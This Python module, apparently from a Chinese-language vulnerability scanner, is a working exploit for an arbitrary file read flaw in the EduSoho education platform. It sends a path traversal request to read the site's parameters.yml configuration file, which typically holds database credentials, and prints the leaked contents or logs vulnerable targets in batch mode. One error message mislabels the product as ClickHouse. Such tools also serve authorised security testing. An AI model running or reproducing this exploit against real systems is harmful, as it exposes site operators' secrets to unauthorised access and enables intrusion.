import warnings,requests
import xml.etree.ElementTree as ET
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
warnings.filterwarnings("ignore")
class EduSoho_File_Read_Scan:
    def run(self,url):
        base_url = url + "/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml"
        try:
            response = requests.get(base_url,headers=self.headers,verify=self.ssl,proxies=self.proxy)
            if "database" in response.text:
                OutPrintInfoSuc("EduSoho", f"目标存在漏洞！{base_url}")
                if not self.batch:
                    OutPrintInfo("EduSoho", f"执行结果:")
                    OutPrintInfo("EduSoho", f"响应:\n{response.text.strip()}")
                else:
                    OutPutFile("edusoho_file_read.txt",f"目标存在漏洞！{base_url}")

                return True
            else:
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("ClickHouse", "目标请求出错")
                return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy)
        if not self.batch:
            OutPrintInfo("EduSoho", f"开始检测EduSoho教培系统任意文件读取漏洞...")
        self.run(url)
        if not self.batch:
            OutPrintInfo("EduSoho", f"EduSoho教培系统任意文件读取漏洞检测结束")